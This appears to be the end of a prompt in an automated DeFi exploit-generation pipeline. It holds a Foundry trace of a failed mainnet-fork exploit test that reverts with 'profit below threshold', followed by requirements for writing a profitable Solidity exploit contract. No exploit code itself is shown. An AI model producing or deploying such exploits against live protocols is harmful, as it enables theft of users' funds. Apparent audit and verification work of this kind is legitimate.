    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 714973758898589797139509 [7.149e23]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 12000000 [1.2e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445.querySellBase
  at 0x051EBD717311350f1684f89335bed4ABd083a2b6.querySellBase
  at FlawVerifier.planBorrowQuote
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.56s (2.38s CPU time)

Ran 1 test suite in 2.67s (2.56s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2509709)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
